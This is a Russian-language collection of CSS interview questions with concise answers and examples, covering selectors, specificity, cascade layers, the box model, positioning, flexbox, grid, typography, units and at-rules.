#### Основы CSS

1. Что такое CSS и как он подключается к HTML?
	- CSS (Cascading Style Sheets) — язык стилей, описывающий визуальное представление HTML-документа
	- Способы подключения:
		1. Внешний: `<link rel="stylesheet" href="style.css">`
		2. Внутренний: `<style>` в `<head>`
		3. Инлайн: `style="..."` на элементе
		4. `@import url('style.css')` внутри CSS

2. Разница между внешними, внутренними и инлайн стилями?
	- Внешние (`<link>`): отдельный файл, кешируется браузером, лучшая поддерживаемость, рекомендуемый подход
	- Внутренние (`<style>`): в `<head>`, используется для Critical CSS или уникальных стилей страницы
	- Инлайн (`style=""`): максимальная специфичность (кроме `!important`), нет кеширования, плохо для поддержки
	- Приоритет: инлайн > внутренние = внешние (зависит от порядка)

3. Что такое CSS-переменные (custom properties)?
	- Пользовательские свойства с префиксом `--`, используемые через `var()`
	- Наследуются по DOM-дереву, можно переопределять в дочерних элементах
	- В отличие от переменных препроцессоров (Sass), работают в runtime и реагируют на изменения
	```css
	:root {
	  --color-primary: #3b82f6;
	  --spacing: 1rem;
	}
	.button {
	  background: var(--color-primary);
	  padding: var(--spacing, 0.5rem); /* 0.5rem — fallback */
	}
	```

4. Как работает CSS Reset и Normalize?
	- CSS Reset (Eric Meyer) — сбрасывает все стили браузера в ноль (margin, padding, font-size)
	- Normalize.css — сохраняет полезные дефолты, исправляет кроссбраузерные несоответствия
	- Modern CSS Reset — минимальный сброс с `box-sizing: border-box` и удалением margin у body
	```css
	*, *::before, *::after { box-sizing: border-box; }
	body { margin: 0; }
	```

#### Селекторы

5. Что такое селекторы атрибутов?
	- Позволяют выбирать элементы по наличию или значению атрибутов
	- `[attr]` — есть атрибут
	- `[attr=val]` — точное значение
	- `[attr~=val]` — слово в списке через пробел
	- `[attr|=val]` — значение или значение с `-` (lang)
	- `[attr^=val]` — начинается с
	- `[attr$=val]` — заканчивается на
	- `[attr*=val]` — содержит подстроку
	- `[attr=val i]` — case-insensitive flag

6. Как работают селекторы потомков, дочерних элементов и соседних элементов?
	- `A B` — потомок (любой уровень вложенности)
	- `A > B` — прямой дочерний элемент
	- `A + B` — смежный сосед (сразу после A)
	- `A ~ B` — общий сосед (любой после A на том же уровне)

7. Что такое селектор `:not()`?
	- Псевдокласс отрицания: выбирает элементы, НЕ соответствующие аргументу
	- Специфичность `:not()` равна специфичности его аргумента
	- В Selectors Level 4 принимает список: `:not(.a, .b)`
	```css
	li:not(:last-child) { margin-bottom: 1rem; }
	input:not([type="submit"]):not([type="reset"]) { border: 1px solid #ccc; }
	```

8. Как работают селекторы `:first-child`, `:last-child`, `:only-child`?
	- `:first-child` — элемент, который является первым ребёнком своего родителя
	- `:last-child` — последний ребёнок
	- `:only-child` — единственный ребёнок (эквивалент `:first-child:last-child`)
	- Важно: `:first-child` проверяет позицию среди ВСЕХ детей, не только элементов того же типа

9. Разница между `nth-child()` и `nth-of-type()`?
	- `:nth-child(An+B)` — считает ВСЕ дочерние элементы, затем проверяет тип
	- `:nth-of-type(An+B)` — считает только элементы того же типа
	- Пример: `p:nth-child(2)` — второй ребёнок, ЕСЛИ он `<p>`. `p:nth-of-type(2)` — второй `<p>` среди siblings
	- Формулы: `2n` — чётные, `2n+1` — нечётные, `3n` — каждый третий, `-n+3` — первые три

10. Как работают `:nth-last-child()` и `:nth-last-of-type()`?
	- Аналогичны `:nth-child()` и `:nth-of-type()`, но отсчёт идёт с конца
	- `:nth-last-child(1)` = `:last-child`
	- Полезно для: `li:nth-last-child(-n+3)` — последние 3 элемента

11. Как работают `:only-of-type()` и `:empty`?
	- `:only-of-type` — элемент является единственным данного типа среди siblings
	- `:empty` — элемент не имеет дочерних узлов (ни элементов, ни текста, ни пробелов)
	- `:empty` полезен для скрытия пустых контейнеров: `.message:empty { display: none; }`
	- Внимание: пробел или перенос строки делают элемент НЕ empty

12. Как работают `:target` и `:root` селекторы?
	- `:target` — элемент, чей `id` совпадает с фрагментом URL (`#section1`)
	- `:root` — корневой элемент документа (`<html>` для HTML)
	- `:root` имеет бо́льшую специфичность чем `html` (псевдокласс vs тип)
	- `:target` используется для CSS-only табов, аккордеонов, модалок

13. Как работают современные селекторы `:is()`, `:where()`, `:has()`?
	- `:is()` — принимает список селекторов, специфичность = максимальная из списка
	- `:where()` — как `:is()`, но специфичность ВСЕГДА 0
	- `:has()` — "parent selector", выбирает элемент, содержащий определённого потомка
	```css
	:is(h1, h2, h3):hover { color: blue; } /* специфичность (0,1,1) */
	:where(h1, h2, h3):hover { color: blue; } /* специфичность (0,1,0) */
	article:has(img) { display: grid; } /* article, в котором есть img */
	```

14. Как работает `:not()` с множественными селекторами?
	- Level 4: `:not(.a, .b)` — НЕ .a И НЕ .b (forgiving selector list)
	- Level 3 fallback: `:not(.a):not(.b)` — цепочка
	- Специфичность: максимальная из аргументов

#### Каскадность и специфичность

15. Что такое каскадность в CSS?
	- Алгоритм определения, какое значение свойства применяется к элементу при конфликте
	- Порядок разрешения: Origin & Importance → Cascade Layers → Specificity → Order of Appearance
	- Origins: User-Agent (браузер) < User < Author (разработчик)
	- `!important` переворачивает порядок origins

16. Что такое специфичность и как она работает?
	- Вес селектора, определяющий приоритет при конфликте правил одного origin
	- Формат: (ID, CLASS, TYPE)
	- ID: `#id` — вес (1,0,0)
	- CLASS: `.class`, `[attr]`, `:pseudo-class` — вес (0,1,0)
	- TYPE: `element`, `::pseudo-element` — вес (0,0,1)
	- `*`, комбинаторы (>, +, ~, space) — вес (0,0,0)

17. Какой вес у селекторов: `!important`, инлайн-стили, `#id`, `.class`, тег, универсальный `*`?
	- `!important` — переопределяет всё (отдельный слой каскада)
	- Инлайн-стили — (1,0,0,0) — выше любого селектора в stylesheet
	- `#id` — (0,1,0,0)
	- `.class`, `[attr]`, `:pseudo-class` — (0,0,1,0)
	- `element`, `::pseudo-element` — (0,0,0,1)
	- `*` — (0,0,0,0)

18. Как подсчитывается специфичность селекторов?
	- Считаем количество ID, CLASS, TYPE компонентов
	- `#nav .item a:hover` → 1 ID + 1 class + 1 pseudo-class + 1 type = (1,2,1)
	- `div.container > ul li.active` → 0 ID + 2 class + 3 type = (0,2,3)
	- Сравнение — слева направо: (1,0,0) > (0,15,15)

19. Как работает специфичность селекторов атрибутов?
	- Селекторы атрибутов `[type="text"]` имеют ту же специфичность, что и классы: (0,1,0)
	- `input[type="text"]` = (0,1,1)
	- `[id="main"]` = (0,1,0), а `#main` = (1,0,0) — разная специфичность при одном результате

20. Как работает специфичность псевдоклассов и псевдоэлементов?
	- Псевдоклассы (`:hover`, `:focus`, `:nth-child()`) — как класс: (0,1,0)
	- Псевдоэлементы (`::before`, `::after`, `::first-line`) — как тип: (0,0,1)
	- `:is()`, `:not()`, `:has()` — специфичность самого специфичного аргумента
	- `:where()` — ВСЕГДА (0,0,0), используется для обнуления специфичности

21. Что такое наследование в CSS?
	- Механизм, при котором дочерние элементы получают значения свойств от родителей
	- Наследуются: `color`, `font-*`, `line-height`, `text-align`, `visibility`, `cursor`, `list-style`
	- НЕ наследуются: `margin`, `padding`, `border`, `background`, `display`, `width`, `height`, `position`
	- `inherit` — принудительно наследовать, `initial` — сбросить к спецификации

22. Как работают `initial`, `inherit`, `unset`, `revert`?
	- `initial` — начальное значение из спецификации CSS (не браузерное)
	- `inherit` — наследовать значение от родителя
	- `unset` — `inherit` для наследуемых свойств, `initial` для остальных
	- `revert` — откатить к стилям предыдущего origin (user-agent)
	- `revert-layer` — откатить к предыдущему cascade layer

23. Что такое `all` свойство?
	- Shorthand для сброса ВСЕХ свойств элемента (кроме `direction` и `unicode-bidi`)
	- `all: unset` — сбросить все стили элемента
	- `all: revert` — откатить к браузерным стилям
	- Полезно для изоляции компонентов от внешних стилей

24. Как работает `@layer` для управления каскадностью?
	- Cascade Layers позволяют явно управлять порядком приоритета группы стилей
	- Стили вне layers имеют приоритет над всеми layers
	- `!important` внутри layers — приоритет ИНВЕРТИРУЕТСЯ (первый layer > последний)
	```css
	@layer reset, base, components, utilities;
	@layer reset { * { margin: 0; } }
	@layer components { .btn { padding: 1rem; } }
	```

25. Как работает приоритет слоев в CSS?
	- Порядок объявления определяет приоритет: последний layer > первый
	- Unlayered styles > все layers
	- Для `!important`: первый layer > последний layer > unlayered (инверсия)
	```
	Normal:    reset < base < components < utilities < unlayered
	Important: unlayered < utilities < components < base < reset
	```

#### Box Model

26. Разница между блочным и строчным контентом?
	- Блочные элементы: занимают всю ширину, начинаются с новой строки, имеют width/height, margin/padding со всех сторон
	- Строчные: занимают только нужную ширину, не начинают новую строку, вертикальные margin/padding не влияют на поток
	- `inline-block` — гибрид: в потоке как inline, но принимает width/height и вертикальные margin/padding

27. Что такое `content-box` и `padding-box`?
	- `content-box` — width/height задают размер ТОЛЬКО контента (без padding и border)
	- `padding-box` — width/height включают padding (не поддерживается в box-sizing!)
	- В Box Model: общая ширина = width + padding-left + padding-right + border-left + border-right (при content-box)

28. Как работает `box-sizing`?
	- `content-box` (default): width = только контент
	- `border-box`: width = контент + padding + border
	- Рекомендуемый reset: `*, *::before, *::after { box-sizing: border-box; }`
	- border-box упрощает расчёты: `width: 100%` реально занимает 100%, даже с padding

29. Что такое `border-box`?
	- Значение `box-sizing`, при котором `width` и `height` включают padding и border
	- `width: 200px; padding: 20px; border: 2px solid;` → элемент занимает ровно 200px
	- Контент получает: 200 - 20*2 - 2*2 = 156px
	- Используется повсеместно как дефолт через CSS Reset

30. Что такое margin collapse?
	- Схлопывание вертикальных margin между блочными элементами
	- Два margin по 20px дадут 20px, не 40px (берётся максимальный)
	- Происходит: между siblings, между parent и first/last child (если нет border/padding/BFC)
	- НЕ происходит: для flex/grid items, float, absolute/fixed, inline-block, элементов с overflow ≠ visible
	- Негативные margin: если один -10px, другой 20px → итого 10px (сумма)

31. Как работает `box-decoration-break`?
	- Определяет отображение border/padding/background при разрыве элемента (multi-line inline, column break, page break)
	- `slice` (default) — элемент визуально "разрезается", фон/border продолжаются
	- `clone` — каждый фрагмент получает полный набор border/padding/background
	- Полезно для inline элементов с фоном, разбитых на несколько строк

32. Разница между `outline` и `border`?
	- `border` — часть box model, влияет на размер элемента и layout
	- `outline` — НЕ часть box model, рисуется поверх, не влияет на layout
	- `outline` не может быть скруглённым (в старых браузерах), сейчас поддерживает `border-radius`
	- `outline-offset` — отступ outline от border
	- Важно для accessibility: не удаляйте `outline` на `:focus` без альтернативы

33. Как работает `box-shadow` концептуально?
	- Синтаксис: `box-shadow: offsetX offsetY blur spread color inset`
	- `blur` — размытие (Gaussian blur), `spread` — расширение/сжатие тени
	- Multiple shadows: через запятую, первая — сверху
	- `inset` — внутренняя тень
	- Не влияет на layout, рисуется под/над контентом
	```css
	box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1), 0 2px 4px -2px rgba(0,0,0,0.1);
	```

#### Позиционирование

34. Разница между `static`, `relative`, `absolute`, `fixed`, `sticky`?
	- `static` — по умолчанию, элемент в нормальном потоке, top/left/z-index игнорируются
	- `relative` — в потоке, но смещён относительно своей нормальной позиции, создаёт containing block
	- `absolute` — вырван из потока, позиционируется относительно ближайшего позиционированного предка
	- `fixed` — вырван из потока, относительно viewport (или предка с transform/filter/will-change)
	- `sticky` — в потоке до порога, затем "прилипает" при скролле

35. Относительно чего позиционируется `absolute`?
	- Относительно ближайшего предка с `position` != `static` (relative, absolute, fixed, sticky)
	- Если такого нет — относительно Initial Containing Block (обычно viewport)
	- Также: предок с `transform`, `filter`, `perspective`, `will-change`, `contain: paint` создаёт containing block

36. Что такое `position: sticky` и как он работает?
	- Гибрид relative и fixed: элемент в потоке, но "прилипает" при скролле
	- Требует хотя бы одно из: `top`, `bottom`, `left`, `right`
	- "Прилипает" внутри своего containing block (parent с `overflow: hidden` ломает sticky!)
	- Перестаёт "прилипать", когда containing block уходит из viewport

37. Как работает `z-index`?
	- Управляет порядком наложения элементов по оси Z
	- Работает ТОЛЬКО на позиционированных элементах (не static) и flex/grid items
	- Элементы сравниваются в пределах одного stacking context
	- Значения: целые числа (положительные, отрицательные, 0), `auto`

38. Как работает `z-index` с `position`?
	- `z-index` на `static` — игнорируется
	- `z-index` на `relative/absolute/fixed/sticky` — создаёт stacking context (если ≠ auto)
	- Без z-index порядок: background → negative z-index → block-level → float → inline → z-index: 0 → positive z-index

39. Как работает `float` и `clear` (исторически важно)?
	- `float: left/right` — элемент вырывается из потока, текст обтекает его
	- `clear: left/right/both` — элемент не допускает float-элементы с указанной стороны
	- Clearfix: родитель "схлопывается" без float children → решение: `overflow: auto` или `::after { clear: both; }`
	- Сейчас заменён Flexbox и Grid для layout задач

40. Как работает `vertical-align`?
	- Выравнивает inline/inline-block элемент относительно line box
	- Значения: `baseline` (default), `top`, `middle`, `bottom`, `text-top`, `text-bottom`, числа/проценты
	- Частая проблема: 4px gap под img → решение: `vertical-align: middle/block` или `display: block`
	- НЕ работает для block-level элементов (используйте flexbox)

#### Display и типы элементов

41. Какие значения может принимать `display`?
	- Внешний тип: `block`, `inline`, `inline-block`
	- Внутренний тип: `flex`, `inline-flex`, `grid`, `inline-grid`, `table`, `inline-table`
	- Специальные: `none` (убирает из layout и accessibility tree), `contents` (убирает box, дети "поднимаются"), `flow-root` (создаёт BFC)
	- Двухкомпонентный синтаксис: `display: block flex` = внешний block, внутренний flex

42. Разница между `inline`, `inline-block`, `block`?
	- `inline`: в строке, игнорирует width/height, вертикальные margin не влияют
	- `inline-block`: в строке, но принимает width/height и все margin/padding
	- `block`: на новой строке, занимает всю ширину, принимает все свойства box model
	- `inline-block` полезен для: кнопок, навигационных элементов, расположения элементов в строку с размерами

43. Как работает `text-align`?
	- Выравнивает inline-content внутри block контейнера: `left`, `right`, `center`, `justify`
	- Наследуется дочерними элементами
	- Работает для: текста, inline, inline-block, inline-flex, inline-grid
	- `text-align: justify` — растягивает строки, `text-align-last` — управляет последней строкой

#### Flexbox

44. Основные свойства flex-контейнера?
	- `display: flex` / `inline-flex`
	- `flex-direction`: row | row-reverse | column | column-reverse
	- `flex-wrap`: nowrap | wrap | wrap-reverse
	- `justify-content`: flex-start | center | flex-end | space-between | space-around | space-evenly
	- `align-items`: stretch | flex-start | flex-end | center | baseline
	- `align-content`: (для multi-line) stretch | flex-start | flex-end | center | space-between | space-around
	- `gap`: row-gap column-gap

45. Основные свойства flex-элементов?
	- `flex-grow` — коэффициент роста (распределение свободного пространства)
	- `flex-shrink` — коэффициент сжатия
	- `flex-basis` — базовый размер до grow/shrink
	- `order` — визуальный порядок
	- `align-self` — переопределяет align-items для конкретного элемента

46. Что такое `flex-grow`, `flex-shrink`, `flex-basis`?
	- `flex-grow` (default 0): сколько свободного пространства элемент забирает. grow=2 получает вдвое больше чем grow=1
	- `flex-shrink` (default 1): как элемент сжимается при нехватке места. Формула учитывает `flex-basis * flex-shrink`
	- `flex-basis` (default auto): начальный размер до распределения. `auto` = берёт width/height, `0` = игнорирует содержимое
	- Shorthand: `flex: grow shrink basis`

47. Как работает `align-items` vs `align-self`?
	- `align-items` — на контейнере, задаёт выравнивание по cross axis для ВСЕХ items
	- `align-self` — на конкретном item, переопределяет `align-items` для этого элемента
	- Значения: `stretch` (default), `flex-start`, `flex-end`, `center`, `baseline`
	- `baseline` выравнивает по базовой линии текста — полезно для элементов разной высоты

48. Как работают `flex-wrap` и `flex-direction`?
	- `flex-direction` определяет main axis: `row` (→), `row-reverse` (←), `column` (↓), `column-reverse` (↑)
	- `flex-wrap: nowrap` (default) — все items в одну строку, могут сжиматься
	- `flex-wrap: wrap` — items переносятся на новую строку при нехватке места
	- `flex-flow` — shorthand: `flex-flow: row wrap`

49. Как работают `justify-content` и `align-content`?
	- `justify-content` — распределение по MAIN axis (одна строка)
	- `align-content` — распределение СТРОК по cross axis (только при wrap!)
	- `space-between` — первый/последний прижаты к краям, остальные равномерно
	- `space-around` — равные отступы вокруг (двойной отступ между)
	- `space-evenly` — абсолютно равные промежутки

50. Как работает `order` свойство?
	- Изменяет визуальный порядок flex/grid item (default 0)
	- Элементы с меньшим order отображаются первыми
	- Не влияет на DOM-порядок, tab-навигацию, screen readers — проблема accessibility!
	- Используйте осторожно: визуальный и DOM порядок должны совпадать

51. Когда использовать Flexbox vs Grid?
	- Flexbox — одномерная раскладка (строка ИЛИ колонка), content-first
	- Grid — двумерная раскладка (строки И колонки), layout-first
	- Flexbox: навигация, карточки в строку, распределение пространства, выравнивание
	- Grid: макет страницы, сложные сетки, overlapping, named areas
	- Можно комбинировать: Grid для layout, Flexbox для компонентов внутри

#### Grid Layout

52. Что такое grid layout и чем он отличается от flexbox?
	- CSS Grid — двумерная система раскладки, управляющая строками и колонками одновременно
	- Grid: layout-first (определяете сетку, размещаете элементы), Flexbox: content-first (контент определяет размер)
	- Grid позволяет overlap элементов, named areas, subgrid — чего нет в Flexbox

53. Основные свойства grid-контейнера?
	- `display: grid` / `inline-grid`
	- `grid-template-columns`, `grid-template-rows` — определение треков
	- `grid-template-areas` — именованные области
	- `gap` (row-gap, column-gap)
	- `justify-items`, `align-items` — выравнивание items внутри ячеек
	- `justify-content`, `align-content` — выравнивание сетки внутри контейнера

54. Как работают `grid-template-columns` и `grid-template-rows`?
	- Определяют размеры и количество треков (колонок/строк)
	- Значения: px, %, fr, auto, min-content, max-content, minmax(), fit-content()
	- `fr` — доля свободного пространства
	- `repeat()` — повторение: `repeat(3, 1fr)`, `repeat(auto-fill, 200px)`, `repeat(auto-fit, minmax(200px, 1fr))`
	```css
	grid-template-columns: 200px 1fr 2fr;
	grid-template-columns: repeat(auto-fit, minmax(min(250px, 100%), 1fr));
	```

55. Что такое `grid-area` и `grid-template-areas`?
	- `grid-template-areas` — визуальное определение layout через ASCII-art
	- `grid-area` — привязка элемента к именованной области
	- `.` — пустая ячейка, каждая строка в кавычках
	```css
	grid-template-areas:
	  "header header"
	  "sidebar main"
	  "footer footer";
	.header { grid-area: header; }
	```

56. Разница между `justify-items` и `justify-content` в Grid?
	- `justify-items` — выравнивание СОДЕРЖИМОГО ячеек внутри их track (по inline axis)
	- `justify-content` — выравнивание ВСЕЙ СЕТКИ внутри контейнера (если сетка меньше контейнера)
	- Аналогично для `align-items` vs `align-content` (по block axis)

57. Что такое CSS Grid Subgrid?
	- Позволяет вложенному grid использовать треки родительского grid
	- `grid-template-columns: subgrid` — дочерний grid наследует колонки parent
	- Решает проблему выравнивания вложенных элементов с основной сеткой
	- Поддержка: Firefox (давно), Chrome/Safari (с 2023)
	```css
	.child { display: grid; grid-template-columns: subgrid; grid-column: span 3; }
	```

58. Как работает `grid-auto-flow`?
	- Управляет автоматическим размещением items в неявной сетке
	- `row` (default) — заполнение по строкам
	- `column` — заполнение по колонкам
	- `dense` — плотная упаковка (заполняет пропуски), может нарушить DOM порядок

59. Как работают `grid-auto-rows` и `grid-auto-columns`?
	- Задают размер неявных (auto-generated) треков
	- Применяются когда items выходят за пределы явной сетки
	```css
	grid-template-rows: 100px 100px; /* 2 явных ряда */
	grid-auto-rows: 50px; /* остальные ряды по 50px */
	grid-auto-rows: minmax(100px, auto); /* минимум 100px, растут по контенту */
	```

60. Разница между `grid-gap` и `gap`?
	- `grid-gap` — старое название (deprecated, но работает)
	- `gap` — стандартное свойство, работает в Grid, Flexbox, Multi-column
	- `gap: 1rem 2rem` — row-gap column-gap
	- `gap: 1rem` — одинаковый gap по обоим осям

#### Выравнивание

61. Как выровнять элемент по центру? все способы
	- **Flexbox**: `display: flex; justify-content: center; align-items: center;`
	- **Grid**: `display: grid; place-items: center;`
	- **Grid (item)**: `margin: auto;` на grid item
	- **Absolute + transform**: `position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);`
	- **Absolute + inset + margin**: `position: absolute; inset: 0; margin: auto;` (нужен width/height)
	- **text-align + line-height**: для inline контента
	- **margin: 0 auto**: горизонтальное центрирование block с фиксированной шириной

#### Псевдоэлементы и псевдоклассы

62. Что такое псевдоэлементы?
	- Элементы, создаваемые CSS без соответствующих узлов в DOM
	- Обозначаются `::` (двойное двоеточие): `::before`, `::after`, `::first-line`, `::first-letter`, `::selection`, `::placeholder`, `::marker`
	- `::before`/`::after` требуют `content` (может быть пустым `""`)
	- Нельзя применить к void элементам (`<img>`, `<input>`)

63. Что такое псевдоклассы?
	- Селекторы, выбирающие элементы на основе их состояния или позиции в DOM
	- Обозначаются `:` (одно двоеточие)
	- Категории: структурные (`:nth-child`), состояния (`:hover`), UI (`:checked`), функциональные (`:is()`)
	- Не создают новых элементов, а выбирают существующие

#### Типографика

64. Разница между `em`, `rem`, `px`, `%`?
	- `px` — CSS-пиксель (не физический), фиксированный
	- `em` — относительно font-size РОДИТЕЛЯ (компаундинг: вложенные em умножаются)
	- `rem` — относительно font-size корневого элемента (`<html>`), предсказуемый
	- `%` — относительно свойства родителя (width → ширина родителя, font-size → font-size родителя)

65. Что такое `font-display`?
	- Определяет поведение кастомного шрифта при загрузке (в `@font-face`)
	- `swap` — сразу fallback, переключение когда загрузился (FOUT), рекомендуется
	- `block` — невидимый текст ~3с, затем swap (FOIT)
	- `fallback` — невидимый ~100мс, swap только если загрузился за ~3с
	- `optional` — если не загрузился быстро (~100мс), fallback навсегда

66. Как работают `font-variant` и `font-stretch`?
	- `font-variant` — OpenType features: `small-caps`, `all-small-caps`, `oldstyle-nums`, `lining-nums`, `tabular-nums`
	- `font-variant-ligatures` — лигатуры: `common-ligatures`, `no-common-ligatures`
	- `font-stretch` — ширина шрифта: `condensed`, `expanded`, 50%-200%
	- Более низкоуровневый: `font-feature-settings: "liga" 1, "smcp" 1`

67. Как работает `line-height` и его единицы измерения?
	- Определяет высоту строки (межстрочный интервал)
	- Безразмерное значение (рекомендуется): `line-height: 1.5` — умножается на font-size текущего элемента
	- С единицами: `line-height: 24px`, `line-height: 1.5em` — фиксированное значение, наследуется вычисленное
	- Рекомендация: безразмерное для body (`1.5`-`1.7`), иногда фиксированное для заголовков

68. Как работают `letter-spacing` и `word-spacing`?
	- `letter-spacing` — расстояние между символами (positive — раздвигает, negative — сжимает)
	- `word-spacing` — дополнительное расстояние между словами (к пробелу)
	- Единицы: px, em, rem (em привязан к font-size)
	- Заголовки часто: `letter-spacing: -0.02em`, body text: `letter-spacing: 0.01em`

69. Как работает `text-decoration` и его варианты?
	- Shorthand: `text-decoration: line style color thickness`
	- `text-decoration-line`: underline, overline, line-through, none
	- `text-decoration-style`: solid, double, dotted, dashed, wavy
	- `text-decoration-color`: цвет
	- `text-decoration-thickness`: auto, from-font, длина
	- `text-underline-offset` — отступ подчёркивания от текста

70. Как работает `text-shadow` и множественные тени?
	- Синтаксис: `text-shadow: offsetX offsetY blur color`
	- Множественные: через запятую (первая — сверху)
	- Нет spread (в отличие от box-shadow), нет inset
	```css
	text-shadow: 1px 1px 2px rgba(0,0,0,0.3), 0 0 10px rgba(0,0,0,0.1);
	```

71. Как работают `white-space` и `word-wrap`?
	- `white-space: normal` — схлопывание пробелов, перенос по ширине
	- `white-space: nowrap` — без переноса
	- `white-space: pre` — сохраняет пробелы и переносы (как `<pre>`)
	- `white-space: pre-wrap` — сохраняет пробелы, переносит по ширине
	- `white-space: pre-line` — схлопывает пробелы, сохраняет переносы строк
	- `overflow-wrap: break-word` (бывший `word-wrap`) — переносит длинные слова

72. Как работает `text-overflow: ellipsis`?
	- Показывает `...` для обрезанного текста
	- Требует: `overflow: hidden`, `white-space: nowrap` (для однострочного)
	- Многострочный: `-webkit-line-clamp: 3`, `display: -webkit-box`, `-webkit-box-orient: vertical`, `overflow: hidden`
	```css
	/* Однострочный */
	.truncate { white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
	/* Многострочный */
	.clamp { display: -webkit-box; -webkit-line-clamp: 3; -webkit-box-orient: vertical; overflow: hidden; }
	```

73. Как работает `text-align-last` и `text-justify`?
	- `text-align-last` — выравнивание последней строки при `text-align: justify`
	- Значения: auto, start, end, left, right, center, justify
	- `text-justify` — метод выравнивания при justify: `auto`, `inter-word`, `inter-character`

74. Как работают `text-indent` и `text-transform`?
	- `text-indent` — отступ первой строки: px, em, %, `hanging` (все строки кроме первой)
	- `text-transform`: `uppercase`, `lowercase`, `capitalize`, `none`, `full-width`
	- `capitalize` — первая буква каждого слова в верхний регистр

75. Как работает `font-feature-settings` для OpenType функций?
	- Низкоуровневый доступ к OpenType features шрифта
	- `font-feature-settings: "liga" 1, "kern" 1, "smcp" 1`
	- Табличные цифры: `"tnum" 1`, лигатуры: `"liga" 1`, капитель: `"smcp" 1`
	- Предпочтительнее `font-variant-*` (высокоуровневый API), но settings даёт больше контроля

#### Единицы измерения

76. Что такое viewport единицы `vh`, `vw`, `vmin`, `vmax`?
	- `1vw` = 1% ширины viewport, `1vh` = 1% высоты viewport
	- `vmin` = меньшее из vw и vh, `vmax` = большее
	- Проблема: `100vh` на мобильных включает адресную строку
	- Решение: `svh` (small), `lvh` (large), `dvh` (dynamic) — новые viewport units

77. Что такое `ch`, `ex` и другие единицы на основе символов?
	- `ch` — ширина символа "0" в текущем шрифте (полезно для ограничения ширины текста)
	- `ex` — высота строчной буквы "x"
	- `ic` — ширина символа "水" (CJK)
	- `lh` — line-height текущего элемента
	- `rlh` — line-height корневого элемента
	- Применение: `max-width: 65ch` — оптимальная ширина строки для чтения

78. Что такое `fr` единицы в Grid?
	- `fr` (fraction) — доля свободного пространства в grid container
	- Свободное пространство = размер контейнера - фиксированные треки - gap
	- `1fr 2fr` — второй трек в 2 раза шире первого
	- `fr` распределяется ПОСЛЕ min-content, фиксированных значений и gap

79. Что такое `dpi`, `dpcm` единицы разрешения?
	- `dpi` — dots per inch, `dpcm` — dots per centimeter, `dppx` — dots per px unit
	- Используются в `@media (resolution: 2dppx)` — Retina экраны
	- `1dppx` = стандартный экран, `2dppx` = Retina, `3dppx` = super retina
	- Эквивалент: `2dppx` = `192dpi`

80. Что такое Container query units (`cqw`, `cqh`)?
	- Единицы относительно размера ближайшего query container
	- `cqw` = 1% ширины контейнера, `cqh` = 1% высоты
	- `cqi` / `cqb` — inline / block размер (логические)
	- `cqmin` / `cqmax` — меньшее / большее из cqi и cqb
	- Требуют `container-type: inline-size` или `size` на предке

#### CSS функции

81. Как работают `calc()`, `min()`, `max()`, `clamp()`?
	- `calc()` — арифметика с разными единицами: `calc(100% - 2rem)`
	- `min()` — выбирает МИНИМАЛЬНОЕ из значений: `width: min(100%, 800px)`
	- `max()` — выбирает МАКСИМАЛЬНОЕ: `padding: max(2rem, 5vw)`
	- `clamp(min, preferred, max)` = `max(min, min(preferred, max))`
	- Можно вкладывать: `calc(min(100vw, 1200px) - 2rem)`

82. Как работает `var()` для CSS переменных?
	- `var(--name)` — подставляет значение custom property
	- `var(--name, fallback)` — fallback если переменная не определена
	- Можно вкладывать: `var(--color, var(--default-color, blue))`
	- Невалидное значение → свойство получает `unset` (inherited или initial)
	- Нельзя использовать в media queries, именах свойств, селекторах

83. Как работает `attr()` для атрибутов элементов?
	- `attr(name)` — подставляет значение HTML атрибута
	- Сейчас работает только в `content`: `content: attr(data-tooltip)`
	- CSS Values Level 5 расширит: `width: attr(data-width px)` — пока нет поддержки
	```css
	[data-tooltip]::after { content: attr(data-tooltip); }
	```

84. Как работает `url()` для путей к ресурсам?
	- Ссылка на внешний ресурс: `url('path/to/file')`
	- Относительный путь — от CSS файла (не от HTML)
	- Абсолютный: `url('https://cdn.example.com/img.png')`
	- Data URI: `url('data:image/svg+xml,...')`
	- Кавычки опциональны, но рекомендуются

#### At-rules (@правила)

85. Как работает `@import` для импорта стилей?
	- `@import url('file.css')` — импортирует CSS файл
	- Должен быть перед любыми другими правилами (кроме `@charset`, `@layer`)
	- Каждый `@import` — дополнительный HTTP запрос (плохо для производительности)
	- Можно с условием: `@import url('print.css') print`
	- Рекомендуется `<link>` вместо `@import` для production

86. Что такое `@charset` и зачем он нужен?
	- `@charset "UTF-8"` — объявляет кодировку CSS файла
	- Должен быть первым в файле (до любых символов, даже BOM)
	- В большинстве случаев не нужен: HTTP header `Content-Type: text/css; charset=UTF-8` приоритетнее
	- Если файл UTF-8 и сервер отдаёт правильный header — `@charset` избыточен

87. Как работает `@namespace` для пространств имен?
	- Определяет пространство имён XML для CSS селекторов
	- Используется для SVG и MathML: `@namespace svg url(http://www.w3.org/2000/svg)`
	- Позволяет: `svg|rect { fill: blue; }` — только SVG `<rect>`
	- Редко нужен в обычной HTML-разработке

88. Как работают `@page` стили для печати?
	- Управляет стилями печатных страниц
	- `@page { size: A4; margin: 2cm; }`
	- Псевдоклассы: `@page :first`, `@page :left`, `@page :right`
	- `@page :blank` — пустая страница перед новым разделом
	- Работает с `break-before: page`, `break-after: page`

#### Псевдоэлементы

89. Как работают `::before` и `::after`?
	- Создают псевдоэлемент как первый/последний дочерний элемент
	- Требуют `content` (пустой `""` или текст/attr()/counter)
	- По умолчанию inline, можно менять display
	- Не работают на void элементах (img, input, br)
	- Часть DOM для стилей, но НЕ часть DOM tree (нет в JS querySelectorAll)

90. Как работают `::first-line` и `::first-letter`?
	- `::first-line` — первая визуальная строка блочного элемента (зависит от ширины!)
	- `::first-letter` — первый символ первой строки
	- Ограниченный набор свойств: font-*, color, background-*, text-decoration, text-transform, line-height, word-spacing, letter-spacing
	- `::first-letter` включает punctuation перед буквой (кавычки)

91. Как работает `::selection` для выделения текста?
	- Стилизует выделенный пользователем текст
	- Ограниченные свойства: `color`, `background-color`, `text-decoration`, `text-shadow`, `stroke-color`, `fill-color`
	- `-webkit-appearance` для кроссбраузерности (не нужен в 2024+)
	```css
	::selection { background: #3b82f6; color: white; }
	```

92. Как работает `::placeholder` для input полей?
	- Стилизует placeholder текст в `<input>` и `<textarea>`
	- По умолчанию полупрозрачный текст
	- Поддерживает: color, font-*, text-*, opacity, background (ограниченно)
	```css
	::placeholder { color: #9ca3af; opacity: 1; }
	```

#### Псевдоклассы

